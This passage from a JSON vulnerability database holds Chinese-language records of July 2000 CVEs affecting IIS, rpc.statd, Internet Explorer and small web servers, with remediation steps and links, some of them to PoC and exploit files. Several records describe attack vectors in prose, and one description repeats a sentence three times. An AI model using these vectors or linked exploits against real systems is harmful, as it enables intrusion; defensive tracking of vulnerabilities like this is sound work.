","https://www.exploit-db.com/exploits/16816","https://github.com/CVEProject/cvelistV5/blob/487ea3f21ed49470634e758e1f8f2ac74b64d6b0/cves/2000/0xxx/CVE-2000-0665.json","https://github.com/Patrowl/PatrowlHearsData/blob/1c367c2407e523ae413438625300667710835348/CVE/data/2000/CVE-2000-0665.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0665","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2000/CVE-2000-0665.json","https://github.com/olbat/nvdcve/blob/add906b6a8ba20fd533c6fdd7f023c73e6090f3a/nvdcve/CVE-2000-0665.json","https://github.com/opencve/opencve-kb/blob/3a9acb85c323f70b3c41e59a73040cf73e226b4d/2000/CVE-2000-0665.json","https://github.com/HORKimhab/poc-cve-collection/blob/050a55b80525b99be98f5c84fe46fa8ac25be676/2000/0xxx/CVE-2000-0665.md","https://github.com/fkie-cad/nvd-json-data-feeds/blob/4aa573a753d6387eff023ebcf6fc6297b912048e/CVE-2000/CVE-2000-06xx/CVE-2000-0665.json","https://github.com/e-m-b-a/emba/blob/9f33e551f5d4c0bb4df8de596869fddfb4c874cc/config/msf_cve-db.txt","https://github.com/CyberSecAI/cve_info/blob/03b7e36424574a3a9ba5fd13480a326b666a1046/2000/0xxx/CVE-2000-0665.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0517.toml"},{"ave_id":"AVE-2000-0484","file_name":"2000/AVE-2000-0484.toml","cve_id":"CVE-2000-0630","title":"微软 IIS 4.0/5.0 源码碎片泄露漏洞","description":"Microsoft IIS 4.0/5.0 Web服务器存在文件片段解析漏洞，攻击者可通过向目标服务器发送包含+.htr参数的HTTP请求，诱使服务器错误地将该参数视为文件扩展名并解析返回内部源代码的HTML片段，导致敏感应用源代码信息泄露。该漏洞影响Windows平台上的广泛Web服务系统，包括企业内部网站、在线门户等关键Web应用。攻击者无需认证即可发起攻击，构造恶意URL利用IIS的正常文件读取机制，将+.htr参数解析为有效的文件路径，逐步揭示Web应用的源代码实现细节，获取应用程序的内部逻辑、技术架构和业务流程等敏感信息，从而为进一步攻击提供重要情报支持，最终可能导致更严重的系统安全事件。Microsoft已于2000年7月发布安全更新修复此漏洞。相关安全通告显示，此漏洞对机密信息的读取存在严重风险，但对数据完整性和可用性影响有限。Microsoft已发布安全更新修复此漏洞。相关安全通告显示，此漏洞对机密信息的读取存在严重风险，但对数据完整性和可用性影响有限。Microsoft已发布安全更新修复此漏洞。相关安全通告显示，此漏洞对机密信息的读取存在严重风险，但对数据完整性和可用性影响有限。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2000-0630"],"sources":["avd"],"published":"2000-07-17T04:00:00Z","updated":"2026-06-16T21:52:08Z","remediation":"建议立即升级至 Microsoft IIS 6.0 或更高版本，或安装 Microsoft 安全公告 MS00-058 (KB269862) 提供的补丁。若暂时无法升级，请在 IIS 管理器中禁用 .htr ISAPI 映射：打开 IIS 管理器 -> 网站属性 -> 主目录 -> 配置 -> 应用程序映射，删除 .htr 扩展名的映射条目，或在注册表 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameters\\Script Map 中删除 .htr 映射项，随后重启 IIS 服务生效。作为临时缓解，也可在防火墙层面拦截包含 +.htr 的 URL 请求。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://www.securityfocus.com/bid/1488","https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-044","https://exchange.xforce.ibmcloud.com/vulnerabilities/5104","https://www.exploit-db.com/exploits/20089","https://github.com/CVEProject/cvelistV5/blob/8a32d285d75465c2c539e92c7500793aa7910652/cves/2000/0xxx/CVE-2000-0630.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0630","https://github.com/HORKimhab/poc-cve-collection/blob/56ecbe5708e7172ccdeffde501e0321bbd31bea6/2000/0xxx/CVE-2000-0630.md","https://github.com/Patrowl/PatrowlHearsData/blob/86ec648b067e7f3c439a59ccb9e6e448f07cc2d1/CVE/data/2000/CVE-2000-0630.json","https://github.com/github/advisory-database/blob/bf2e2ab4687e3840d3ae537224ca3dbe9e3c1067/advisories/unreviewed/2022/04/GHSA-4pcm-9qq9-65qc/GHSA-4pcm-9qq9-65qc.json","https://github.com/rhuitl/uClinux/blob/0486e80a025dccbe4a2213715a2ab8a5063ea86b/user/snort/drop-rules/web-iis.rules","https://github.com/yarencheng/cve-devops-playground/blob/c54e59752dddfc9aa36c13774164384cfa0d1f04/content/CVE-2000-0630.md","https://github.com/marcellodesales/aibbp-reverse-engineer/blob/960f610d597aae9fec1cc5f03c68679be00c222d/reverse_engineer/invicti/vulnerabilities/db/vulnerabilities/vdb/2000/0xxx/cve-2000-0630.yaml","https://github.com/xqcyberscore/nvt/blob/978f6a9acb495d7d669239530ffe6da5d631f4da/pre2008/iis_frag_disclosure.nasl","https://github.com/intSpLoiT/intframework/blob/eabaa799d0260aa52b735fa9769266d1ce4b64ef/modules/cve_list.txt"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2000/POC-AVE-2000-0484.toml"],"repo_exp_urls":["https://raw.githubusercontent.com/adysec/AVE/main/exploits/2000/EXP-AVE-2000-0484.toml"],"has_poc":true,"has_exp":true,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0484.toml"},{"ave_id":"AVE-2000-0518","file_name":"2000/AVE-2000-0518.toml","cve_id":"CVE-2000-0666","title":"Linux nfs-utils rpc.statd 远程格式字符串漏洞","description":"nfs-utils 软件包中的 rpc.statd 守护进程存在格式字符串漏洞，该程序未能正确过滤和处理来自远程用户的可信格式字符串参数。未经身份认证的远程攻击者可通过向目标系统上运行的 rpc.statd 服务发送特制的包含格式字符串占位符（如 %n、%x）的 RPC 请求，利用该漏洞触发内存越界写入，从而以 root 权限执行任意代码。该漏洞影响 Conectiva 4.x/5.x、Debian 2.x、RedHat 6.x、S.u.S.E 6.x/7.0 及 Trustix 1.x 等多个 Linux 发行版，CVSS 评分 10.0，危害等级严重。攻击无需任何认证，利用复杂度低，已存在公开的远程利用代码。","severity":"CRITICAL","score":10.0,"aliases":["CVE-2000-0666"],"sources":["avd"],"published":"2000-07-16T04:00:00Z","updated":"2026-06-16T21:52:13Z","remediation":"升级 nfs-utils 至 0.1.9.1 及以上版本（Red Hat 用户安装 RHSA-2000-043 更新包，Debian 用户更新至 nfs-utils_0.1.9.1-1）。如无法立即升级，可在防火墙阻断外部对 rpc.statd 端口（默认 111/TCP/UDP 及动态 RPC 端口）的访问，或禁用 NFS 服务中的 rpc.statd 组件作为临时缓解措施。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://archives.neohapsis.com/archives/bugtraq/2000-07/0206.html","http://archives.neohapsis.com/archives/bugtraq/2000-07/0230.html","http://archives.neohapsis.com/archives/bugtraq/2000-07/0236.html","http://archives.neohapsis.com/archives/bugtraq/2000-07/0260.html","http://www.calderasystems.com/support/security/advisories/CSSA-2000-025.0.txt","http://www.cert.org/advisories/CA-2000-17.html","http://www.redhat.com/support/errata/RHSA-2000-043.html","http://www.securityfocus.com/bid/1480","https://exchange.xforce.ibmcloud.com/vulnerabilities/4939","https://www.exploit-db.com/exploits/20077","https://github.com/CVEProject/cvelistV5/blob/487ea3f21ed49470634e758e1f8f2ac74b64d6b0/cves/2000/0xxx/CVE-2000-0666.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0666","https://github.com/Patrowl/PatrowlHearsData/blob/6052148b71cb79d42fd4a59f87982387b0487834/CVE/data/2000/CVE-2000-0666.json","https://github.com/fankh/vulnerability-poc/blob/04aa22fbb624898c1d0928bc3b34fb05529275cb/2000/CVE-2000-0666/README.md","https://github.com/fankh/vulnerability-poc/blob/04aa22fbb624898c1d0928bc3b34fb05529275cb/2000/CVE-2000-0666/README_KO.md","https://github.com/opencve/opencve-kb/blob/3a9acb85c323f70b3c41e59a73040cf73e226b4d/2000/CVE-2000-0666.json","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2000/CVE-2000-0666.json","https://github.com/HORKimhab/poc-cve-collection/blob/c8205feda508d733c873e4904e8ec7780820d9e3/2000/0xxx/CVE-2000-0666.md","https://github.com/olbat/nvdcve/blob/add906b6a8ba20fd533c6fdd7f023c73e6090f3a/nvdcve/CVE-2000-0666.json","https://github.com/CyberSecAI/cve_info/blob/03b7e36424574a3a9ba5fd13480a326b666a1046/2000/0xxx/CVE-2000-0666.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2000/POC-AVE-2000-0518.toml"],"repo_exp_urls":[],"has_poc":true,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0518.toml"},{"ave_id":"AVE-2000-0804","file_name":"2000/AVE-2000-0804.toml","cve_id":"CVE-2000-0662","title":"Microsoft Internet Explorer 5.x 及 Outlook DHTML Edit Control 任意文件读取漏洞","description":"Internet Explorer 5.x 及 Microsoft Outlook 中 DHTML Edit Control（DHTMLED）存在任意文件读取漏洞。远程攻击者可通过构造特制网页，利用 IFRAME 重定向技术绕过浏览器安全限制，读取目标系统上的任意文件内容。攻击无需身份认证，仅需诱导用户访问恶意网页即可触发，影响范围广泛。该漏洞 CVSS 评分 5.0，危害等级中等，主要威胁为敏感信息泄露。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2000-0662"],"sources":["avd"],"published":"2000-07-14T04:00:00Z","updated":"2026-06-16T21:52:12Z","remediation":"建议立即升级至 Internet Explorer 6.0 或更高版本（2001 年 8 月发布），该版本已修复 DHTML Edit Control 的任意文件读取漏洞。对于 Outlook 用户，请升级至 Outlook 2002 或更高版本。如无法升级，可通过注册表为 DHTML Edit Control 控件（CLSID: 2D360201-FFF5-11D1-8D03-00A0C959BC0E）设置 Kill Bit 来禁用该 ActiveX 控件，具体操作为：在 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\ActiveX Compatibility\\{2D360201-FFF5-11D1-8D03-00A0C959BC0E} 下创建 DWORD 值 Compatibility Flags 并设为 0x0400。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://www.securityfocus.com/bid/1474","http://www.securityfocus.com/templates/archive.pike?list=1&msg=396EF9D5.62EEC625%40nat.bg","https://exchange.xforce.ibmcloud.com/vulnerabilities/5107","https://github.com/CVEProject/cvelistV5/blob/4e42829e595f1a9b61ce455f2ab870c6325fb1ad/cves/2000/0xxx/CVE-2000-0662.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0662","https://github.com/HORKimhab/poc-cve-collection/blob/050a55b80525b99be98f5c84fe46fa8ac25be676/2000/0xxx/CVE-2000-0662.md","https://github.com/Patrowl/PatrowlHearsData/blob/1c367c2407e523ae413438625300667710835348/CVE/data/2000/CVE-2000-0662.json","https://github.com/github/advisory-database/blob/7b437709e7540c8c9af0a3ecc5a6f3df80f4ff33/advisories/unreviewed/2022/04/GHSA-c5pm-gfqm-wxp7/GHSA-c5pm-gfqm-wxp7.json","https://github.com/intSpLoiT/intframework/blob/eabaa799d0260aa52b735fa9769266d1ce4b64ef/modules/cve_list.txt","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2000/CVE-2000-0662.json","https://github.com/KTZgraph/sarenka/blob/f1fb931ab722d6c096d581ed6e3c5966d799fbaa/sarenka/feeds/cve_details/cve_all_details_152600_152700.json","https://github.com/oasis-open/cti-stix-common-objects/blob/55ba7598cbd5a52577b6887871505d931d85cb61/objects/vulnerability/vulnerability--02422749-00e0-4542-a217-25203dab19d3.json","https://github.com/yarencheng/cve-devops-playground/blob/c54e59752dddfc9aa36c13774164384cfa0d1f04/content/CVE-2000-0662.md"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0804.toml"},{"ave_id":"AVE-2000-0766","file_name":"2000/AVE-2000-0766.toml","cve_id":"CVE-2000-0631","title":"微软 IIS 3.0/4.0/5.0 管理脚本拒绝服务漏洞","description":"微软 IIS 3.0/4.0/5.0 中包含的一个管理脚本（源自 IIS 3.0）存在拒绝服务漏洞，被称为\"缺失目录浏览器参数\"漏洞。该脚本在被访问时未验证是否提供了特定必需参数，远程未经身份验证的攻击者可直接发送 HTTP 请求访问该脚本，触发异常导致 IIS 服务崩溃或系统资源耗尽，造成拒绝服务。受影响版本包括 IIS 3.0、4.0 及 5.0，主要影响运行这些 IIS 版本的 Windows 服务器。攻击无需身份验证，可远程发起，CVSS 评分 5.0（MEDIUM），攻击向量为网络、攻击复杂度低、无需认证、仅影响可用性。微软于 2000 年 7 月发布安全公告 MS00-044 发布补丁修复此漏洞，建议升级至 IIS 5.0 SP4 或更高版本，或应用对应补丁，亦可通过删除 .HTR 脚本映射或限制 /scripts/iisadmin 目录访问权限缓解风险。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2000-0631"],"sources":["avd"],"published":"2000-07-14T04:00:00Z","updated":"2026-06-16T21:52:08Z","remediation":"安装 Microsoft 安全公告 MS00-044 发布的补丁程序，修复 IIS 管理脚本缺失参数时进入死循环的问题。升级至 IIS 5.0 SP4 或更高版本，或在 IIS 4.0 上应用对应补丁。若无需 HTR 功能，直接删除 .HTR 脚本映射以彻底消除风险。补丁安装后，修改 IIS 虚拟目录 /scripts/iisadmin 的 NTFS 权限，仅允许 Administrators 组访问，阻止远程用户通过目录浏览脚本获取服务器文件结构信息。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://marc.info/?l=bugtraq&m=96390444022878&w=2","http://www.securityfocus.com/bid/1476","https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-044","https://exchange.xforce.ibmcloud.com/vulnerabilities/4951","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2000/CVE-2000-0631.md","https://github.com/CVEProject/cvelistV5/blob/8a32d285d75465c2c539e92c7500793aa7910652/cves/2000/0xxx/CVE-2000-0631.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0631","https://github.com/ARPSyndicate/suricata-vedas/blob/fe24794ad36564b5bbc7c69101525011387b8650/2000/CVE-2000-0631.rules","https://github.com/edoardottt/missing-cve-nuclei-templates/blob/b93b72c800b93d13fcc97984485ecaf9a9b5cbc1/data/year/2000.txt","https://github.com/Patrowl/PatrowlHearsData/blob/86ec648b067e7f3c439a59ccb9e6e448f07cc2d1/CVE/data/2000/CVE-2000-0631.json","https://github.com/mabitoski/cve_submodules/blob/44ad7e2705b3aef1b2ffaf64bd47596c10a6c2e4/2000/CVE-2000-0631.md","https://github.com/github/advisory-database/blob/ba518c3d2e41cb46015251f8c5b067b05ea0ba59/advisories/unreviewed/2022/04/GHSA-gm9r-p48q-qmx6/GHSA-gm9r-p48q-qmx6.json","https://github.com/marcellodesales/aibbp-reverse-engineer/blob/960f610d597aae9fec1cc5f03c68679be00c222d/reverse_engineer/acunetix/vulnerabilities/vdb/2000/0xxx/cve-2000-0631.yaml","https://github.com/intSpLoiT/intframework/blob/eabaa799d0260aa52b735fa9769266d1ce4b64ef/modules/cve_list.txt"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0766.toml"},{"ave_id":"AVE-2000-0527","file_name":"2000/AVE-2000-0527.toml","cve_id":"CVE-2000-0675","title":"Infopulse GateKeeper 远程缓冲区溢出漏洞","description":"Infopulse GateKeeper 3.5 及更早版本存在缓冲区溢出漏洞，未经身份认证的远程攻击者可通过向目标服务发送超长字符串触发该漏洞，导致任意命令执行。该漏洞影响 Infopulse GateKeeper 3.5 及之前所有版本，CVSS 评分 7.5，危害等级高，且已有公开的远程利用代码。","severity":"HIGH","score":7.5,"aliases":["CVE-2000-0675"],"sources":["avd"],"published":"2000-07-13T04:00:00Z","updated":"2026-06-16T21:52:14Z","remediation":"立即升级 Infopulse GateKeeper 至 3.6 或更高版本。如无法立即升级，在防火墙层面限制对 TCP 端口 2000 的访问，仅允许可信 IP 连接，作为临时缓解措施。","status":"completed","collected_at":"2026-07-28T00:00:00Z","references":["http://www.securityfocus.com/bid/1477","http://www.securityfocus.com/templates/archive.pike?list=1&msg=00af01bfece2%24a52cbd80%24367e1ec4%40kungphusion","https://exchange.xforce.ibmcloud.com/vulnerabilities/4948","https://www.exploit-db.com/exploits/20074","https://github.com/CVEProject/cvelistV5/blob/0118bdf83d51e7ec6262ccd7acc694cb751b5bf8/cves/2000/0xxx/CVE-2000-0675.json","https://github.com/Patrowl/PatrowlHearsData/blob/d2f32d8750bd50219425137a8fc56ab841cc707b/CVE/data/2000/CVE-2000-0675.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0675","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2000/CVE-2000-0675.json","https://github.com/olbat/nvdcve/blob/add906b6a8ba20fd533c6fdd7f023c73e6090f3a/nvdcve/CVE-2000-0675.json","https://github.com/fkie-cad/nvd-json-data-feeds/blob/3e38e95f2e1dd1607b843a3c921eb524d7c4f47f/CVE-2000/CVE-2000-06xx/CVE-2000-0675.json","https://github.com/opencve/opencve-kb/blob/0ccbe74701d72e8d7117a09b2db369605fa0bae6/2000/CVE-2000-0675.json","https://github.com/HORKimhab/poc-cve-collection/blob/c8205feda508d733c873e4904e8ec7780820d9e3/2000/0xxx/CVE-2000-0675.md","https://github.com/CyberSecAI/cve_info/blob/03b7e36424574a3a9ba5fd13480a326b666a1046/2000/0xxx/CVE-2000-0675.json","https://github.com/CVEProject/cvelist-dev/blob/5b8fbb570438e8094550205589cc6f1d122acc94/2000/0xxx/CVE-2000-0675.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0527.toml"},{"ave_id":"AVE-2000-0501","file_name":"2000/AVE-2000-0501.toml","cve_id":"CVE-2000-0649","title":"微软 IIS 内部IP地址泄露漏洞","description":"Microsoft IIS 2.0/3.0/4.0/5.0/5.1 存在安全配置漏洞，当网站启用基本身份验证但未设置身份验证区域时，攻击者可通过简单的 HTTP 1.0 协议请求直接获取服务器的内部IP地址。该漏洞影响广泛版本的IIS服务，攻击者无需任何身份验证即可获得服务器的网络位置信息，为进一步攻击提供重要线索。该漏洞由请求逻辑缺陷引起，由于身份验证流程在未定义区域时返回敏感的网络配置信息，导致CWE-200信息泄露风险。攻击者通过发送特定HTTP头部构造的请求包即可触发该漏洞，对企业网络安全构成严重威胁。","severity":"LOW","score":2.6,"aliases":["CVE-2000-0649"],"sources":["avd"],"published":"2000-07-13T04:00:00Z","updated":"2026-06-16T21:52:11Z","remediation":"立即安装 Microsoft IIS 4.0/5.0 对应安全补丁（2000 年 8 月发布）或升级至 IIS 6.0 及更高版本。在 IIS 管理器中为所有启用基本认证的目录配置认证 Realm 值，或禁用基本认证改用 Windows 集成认证（NTLM/Kerberos）。IIS 7.0 及以上版本需执行 appcmd set config -section:system.webServer/serverRuntime /alternateHostName:\"服务器名\" /commit:apphost 命令设置 alternateHostName。此外，在防火墙或反向代理层面对外隐藏内部 IP 地址，禁止直接响应未携带 Host 头的 HTTP 1.0 请求。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0025.html","http://www.securityfocus.com/bid/1499","https://www.exploit-db.com/exploits/20096","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2000/CVE-2000-0649.md","https://github.com/nomi-sec/PoC-in-GitHub/blob/d0611a30d788ecc6797a40a15a38427bf0c3c17b/2000/CVE-2000-0649.json","https://github.com/rix4uni/cvemapping/blob/7328ab6aaf7adbdc368c695f29b077ae955aa9f0/2000/CVE-2000-0649/cve-2000-0649.py","https://github.com/0xhav0c/FastVulnVerify/blob/1b2f1024e950cdb2820b3fca11e68f84dab87d26/exploits/CVE-2000-0649.py","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0649","https://github.com/ycdxsb/PocOrExp_in_Github/blob/f28024448b3adaf04ff81cb923845fd5725692d0/2000/README.md","https://github.com/CVEProject/cvelistV5/blob/cc838d0e5ff34a3026c5292897b23b79aee8bacf/cves/2000/0xxx/CVE-2000-0649.json","https://github.com/e-m-b-a/emba/blob/9f33e551f5d4c0bb4df8de596869fddfb4c874cc/config/msf_cve-db.txt","https://github.com/diannaofengzi/POC/blob/14d504f7488db9229f6f02be54aab53e3cfee0dc/databases/2000/database/CVE-2000-0649/CVE-2000-0649-rafaelh.md","https://github.com/xqx12/daily-info/blob/f89413f27063960293cde4e697eb944bfe558859/2021/tech_info_20210215.md","https://github.com/rafaelh/CVE-2000-0649","https://github.com/Downgraderz/PoC-CVE-2000-0649","https://github.com/stevenvegar/cve-2000-0649"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0501.toml"},{"ave_id":"AVE-2000-0829","file_name":"2000/AVE-2000-0829.toml","cve_id":"CVE-2000-0674","title":"Virtual Visions FTP浏览器 ftp.pl CGI程序目录遍历漏洞","description":"Virtual Visions FTP浏览器中的ftp.pl CGI程序存在目录遍历漏洞。远程攻击者通过在URL中注入\"..\"（点点斜线）序列，可突破Web文档根目录限制，读取服务器上任意目录下的文件。该漏洞源于程序未对用户输入的路径参数进行充分过滤和规范化处理，导致攻击者能够利用路径回溯符向上跳转目录层级。攻击者无需身份认证即可通过HTTP请求利用此漏洞，获取敏感配置文件、系统信息或其他受保护资源，可能导致进一步的信息泄露和权限提升。受影响的软件版本为Virtual Visions FTP浏览器中集成的ftp.pl CGI程序。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2000-0674"],"sources":["avd"],"published":"2000-07-12T04:00:00Z","updated":"2026-06-16T21:52:14Z","remediation":"立即删除或禁用服务器上的 ftp.pl CGI 脚本，或限制其访问权限仅允许授权用户使用。如厂商已发布补丁版本，请升级至最新版；若产品已停止维护，建议替换为其他受支持的 FTP 浏览器解决方案，并在 Web 服务器层面配置输入过滤，阻止包含 `..` 的路径遍历请求。","status":"completed","collected_at":"2026-07-28T00:00:00Z","references":["http://archives.neohapsis.com/archives/bugtraq/2000-07/0177.html","http://www.securityfocus.com/bid/1471","https://exchange.xforce.ibmcloud.com/vulnerabilities/5187","https://github.com/CVEProject/cvelistV5/blob/93bf7691fc17bf58197ad166ee362b4808566d7c/cves/2000/0xxx/CVE-2000-0674.json","https://github.com/Patrowl/PatrowlHearsData/blob/d2f32d8750bd50219425137a8fc56ab841cc707b/CVE/data/2000/CVE-2000-0674.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0674","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2000/CVE-2000-0674.json","https://github.com/olbat/nvdcve/blob/add906b6a8ba20fd533c6fdd7f023c73e6090f3a/nvdcve/CVE-2000-0674.json","https://github.com/fkie-cad/nvd-json-data-feeds/blob/3e38e95f2e1dd1607b843a3c921eb524d7c4f47f/CVE-2000/CVE-2000-06xx/CVE-2000-0674.json","https://github.com/opencve/opencve-kb/blob/0ccbe74701d72e8d7117a09b2db369605fa0bae6/2000/CVE-2000-0674.json","https://github.com/HORKimhab/poc-cve-collection/blob/c8205feda508d733c873e4904e8ec7780820d9e3/2000/0xxx/CVE-2000-0674.md","https://github.com/CyberSecAI/cve_info/blob/03b7e36424574a3a9ba5fd13480a326b666a1046/2000/0xxx/CVE-2000-0674.json","https://github.com/CVEProject/cvelist-dev/blob/5b8fbb570438e8094550205589cc6f1d122acc94/2000/0xxx/CVE-2000-0674.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0829.toml"},{"ave_id":"AVE-2000-0781","file_name":"2000/AVE-2000-0781.toml","cve_id":"CVE-2000-0643","title":"WebActive HTTP Server 缓冲区溢出拒绝服务漏洞","description":"WebActive HTTP Server 1.00 存在缓冲区溢出漏洞，远程攻击者无需身份认证即可通过向服务器发送超长 URL 请求触发该漏洞，导致服务器进程崩溃，造成拒绝服务。该漏洞影响 WebActive HTTP Server 1.00 版本，攻击复杂度低，仅需网络访问即可利用，无需用户交互，危害等级中危。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2000-0643"],"sources":["avd"],"published":"2000-07-12T04:00:00Z","updated":"2026-06-16T21:52:10Z","remediation":"该漏洞影响 WebActive HTTP Server 1.00，该产品已停止维护，建议立即迁移至其他受支持的 Web 服务器（如 Apache HTTP Server、Nginx 等）。迁移前可在反向代理或 WAF 层面限制 URL 长度不超过 2048 字节，并过滤包含大量连续字符的畸形请求作为临时缓解措施。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://www.securityfocus.com/bid/1470","http://www.securityfocus.com/templates/archive.pike?list=1&msg=200007130827.BAA32671%40Rage.Resentment.org","https://exchange.xforce.ibmcloud.com/vulnerabilities/4949","https://github.com/CVEProject/cvelistV5/blob/933422a5f82611777877a3549b9b8e3c7d70117d/cves/2000/0xxx/CVE-2000-0643.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0643","https://github.com/HORKimhab/poc-cve-collection/blob/47b3b393e16caede3350b5302035c4ef73c36bc7/2000/0xxx/CVE-2000-0643.md","https://github.com/Patrowl/PatrowlHearsData/blob/ad8af7b6d55e05f22d7ff67c808ccd8d54c89d32/CVE/data/2000/CVE-2000-0643.json","https://github.com/rix4uni/cvemapping/blob/7328ab6aaf7adbdc368c695f29b077ae955aa9f0/2000/CVE-2000-0649/cve-2000-0649.py","https://github.com/0xhav0c/FastVulnVerify/blob/1b2f1024e950cdb2820b3fca11e68f84dab87d26/exploits/CVE-2000-0649.py","https://github.com/yarencheng/cve-devops-playground/blob/c54e59752dddfc9aa36c13774164384cfa0d1f04/content/CVE-2000-0643.md","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2000/CVE-2000-0643.json","https://github.com/intSpLoiT/intframework/blob/eabaa799d0260aa52b735fa9769266d1ce4b64ef/modules/cve_list.txt","https://github.com/KTZgraph/sarenka/blob/f1fb931ab722d6c096d581ed6e3c5966d799fbaa/sarenka/feeds/cve_details/cve_all_details_152600_152700.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2000/POC-AVE-2000-0781.toml"],"repo_exp_urls":[],"has_poc":true,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0781.toml"},{"ave_id":"AVE-2000-0780","file_name":"2000/AVE-2000-0780.toml","cve_id":"CVE-2000-0642","title":"WebActive HTTP Server 日志信息泄露漏洞","description":"WebActive HTTP Server 1.00 默认配置将 Web 访问日志文件 active.log 存储在网站文档根目录下，远程攻击者无需身份认证即可通过直接请求该日志文件路径获取敏感信息。该漏洞属于信息泄露类型，攻击者可通过分析日志内容获取访问记录、IP 地址等敏感数据，影响 WebActive HTTP Server 1.00 版本。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2000-0642"],"sources":["avd"],"published":"2000-07-12T04:00:00Z","updated":"2026-06-16T21:52:10Z","remediation":"将 WebActive HTTP Server 的日志文件 active.log 移出网站根目录（document root），存放至非 Web 可访问的目录（如 /var/log/webactive/）；同时配置 Web 服务器禁止直接访问 .log 后缀文件，可通过在配置文件中添加拒绝规则实现。由于该产品已停止维护，建议迁移至受支持的 HTTP 服务器（如 Apache、Nginx）以避免后续安全风险。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://www.securityfocus.com/bid/1497","http://www.securityfocus.com/templates/archive.pike?list=1&msg=200007130827.BAA32671%40Rage.Resentment.org","https://exchange.xforce.ibmcloud.com/vulnerabilities/5184","https://github.com/CVEProject/cvelistV5/blob/933422a5f82611777877a3549b9b8e3c7d70117d/cves/2000/0xxx/CVE-2000-0642.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0642","https://github.com/HORKimhab/poc-cve-collection/blob/47b3b393e16caede3350b5302035c4ef73c36bc7/2000/0xxx/CVE-2000-0642.md","https://github.com/Patrowl/PatrowlHearsData/blob/ad8af7b6d55e05f22d7ff67c808ccd8d54c89d32/CVE/data/2000/